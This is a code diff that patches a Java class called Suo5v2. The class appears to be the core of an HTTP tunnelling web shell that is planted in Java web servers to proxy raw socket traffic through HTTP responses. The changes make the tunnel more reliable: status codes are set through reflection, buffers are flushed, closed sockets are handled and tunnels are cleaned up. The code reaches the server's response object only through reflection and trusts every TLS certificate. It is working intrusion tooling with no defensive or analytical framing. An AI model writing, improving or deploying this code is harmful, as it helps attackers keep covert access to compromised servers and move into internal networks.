@@ -248,8 +248,9 @@ public class Suo5v2 implements Runnable, HostnameVerifier, X509TrustManager {
                 baos.write(bodyContent);
                 byte[] newBody = baos.toByteArray();
                 conn = redirect(req, new String(redirectData), newBody);
+                resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(conn.getResponseCode())});
                 OutputStream out = (OutputStream) resp.getClass().getMethod("getOutputStream").invoke(resp);
-                pipeStream(conn.getInputStream(), out, false);
+                pipeStream(conn.getInputStream(), out, resp, false);
             } finally {
                 if (conn != null) {
                     conn.disconnect();
@@ -346,11 +347,10 @@ public class Suo5v2 implements Runnable, HostnameVerifier, X509TrustManager {
 
         Thread t = null;
         boolean sendClose = true;
+        final OutputStream scOutStream = socket.getOutputStream();
+        final InputStream scInStream = socket.getInputStream();
+        final OutputStream respOutputStream = (OutputStream) resp.getClass().getMethod("getOutputStream").invoke(resp);
         try {
-            final OutputStream scOutStream = socket.getOutputStream();
-            final InputStream scInStream = socket.getInputStream();
-            final OutputStream respOutputStream = (OutputStream) resp.getClass().getMethod("getOutputStream").invoke(resp);
-
             Suo5v2 p = new Suo5v2(scInStream, respOutputStream, tunId);
             t = new Thread(p);
             t.start();
@@ -539,8 +539,8 @@ public class Suo5v2 implements Runnable, HostnameVerifier, X509TrustManager {
             throw new IOException("tunnel not found");
         }
         SocketChannel sc = (SocketChannel) objs[0];
-        if (!sc.isConnected()) {
-            throw new IOException("socket not connected");
+        if (!sc.isOpen()) {
+            return;
         }
 
         byte[] data = (byte[]) dataMap.get("dt");
@@ -563,9 +563,6 @@ public class Suo5v2 implements Runnable, HostnameVerifier, X509TrustManager {
             throw new IOException("tunnel not found");
         }
         SocketChannel sc = (SocketChannel) objs[0];
-        if (!sc.isConnected()) {
-            throw new IOException("socket not connected");
-        }
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         BlockingQueue<byte[]> readQueue = (BlockingQueue<byte[]>) objs[1];
         int maxSize = 512 * 1024; // 1MB
@@ -581,6 +578,10 @@ public class Suo5v2 implements Runnable, HostnameVerifier, X509TrustManager {
             } else {
                 break; // no more data
             }
+        }
+        if (!sc.isOpen() && readQueue.isEmpty()) {
+            performDelete(tunId);
+            baos.write(marshalBase64(newDel(tunId)));
         }
         return baos.toByteArray();
     }
@@ -610,7 +611,7 @@ public class Suo5v2 implements Runnable, HostnameVerifier, X509TrustManager {
         return port;
     }
 
-    private void pipeStream(InputStream inputStream, OutputStream outputStream, boolean needMarshal) throws Exception {
+    private void pipeStream(InputStream inputStream, OutputStream outputStream, Object resp, boolean needMarshal) throws Exception {
         try {
             byte[] readBuf = new byte[1024 * 8];
             while (true) {
@@ -624,6 +625,9 @@ public class Suo5v2 implements Runnable, HostnameVerifier, X509TrustManager {
                 }
                 outputStream.write(dataTmp);
                 outputStream.flush();
+                if (resp != null) {
+                    resp.getClass().getMethod("flushBuffer").invoke(resp);
+                }
             }
         } finally {
             // don't close outputStream
@@ -1031,7 +1035,7 @@ public class Suo5v2 implements Runnable, HostnameVerifier, X509TrustManager {
         // full stream
         if (this.mode == 0) {
             try {
-                pipeStream(gInStream, gOutStream, true);
+                pipeStream(gInStream, gOutStream, null, true);
             } catch (Exception ignore) {
             }
             return;
@@ -1065,8 +1069,15 @@ public class Suo5v2 implements Runnable, HostnameVerifier, X509TrustManager {
                 // write thread
                 while (true) {
                     byte[] data = writeQueue.poll(300, TimeUnit.SECONDS);
-                    if (data == null || data.length == 0) {
+                    if (data == null) {
                         selfClean = true;
+                        break;
+                    }
+                    if (data.length == 0) {
+                        byte[] signal = writeQueue.poll(10, TimeUnit.SECONDS);
+                        if (signal == null) {
+                            selfClean = true;
+                        }
                         break;
                     }
                     ByteBuffer buf = ByteBuffer.wrap(data);
@@ -1080,8 +1091,8 @@ public class Suo5v2 implements Runnable, HostnameVerifier, X509TrustManager {
             if (selfClean) {
 
                 removeKey(this.gtunId);
+                readQueue.clear();
             }
-            readQueue.clear();
             writeQueue.clear();
             try {
                 writeQueue.put(new byte[0]);
